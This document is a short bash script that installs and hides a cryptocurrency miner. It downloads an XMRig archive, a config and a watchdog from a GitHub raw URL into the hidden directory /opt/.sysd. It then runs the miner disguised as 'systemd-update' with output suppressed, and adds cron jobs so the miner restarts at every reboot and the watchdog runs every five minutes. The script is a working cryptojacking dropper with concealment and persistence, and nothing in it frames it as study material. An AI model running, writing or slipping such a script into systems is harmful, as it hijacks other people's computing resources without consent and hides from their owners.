#!/bin/bash

mkdir -p /opt/.sysd && cd /opt/.sysd

curl -fsSL https://raw.githubusercontent.com/ThipyThipy/machine/main/xmrig.tar.gz -o miner.tar.gz
curl -fsSL https://raw.githubusercontent.com/ThipyThipy/machine/main/config.json -o config.json
curl -fsSL https://raw.githubusercontent.com/ThipyThipy/machine/main/watchdog.py -o watchdog.py

tar -xzf miner.tar.gz
chmod +x systemd-update

nohup nice -n 19 ./systemd-update > /dev/null 2>&1 &
(crontab -l 2>/dev/null; echo "@reboot /opt/.sysd/systemd-update") | crontab -
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/bin/python3 /opt/.sysd/watchdog.py") | crontab -
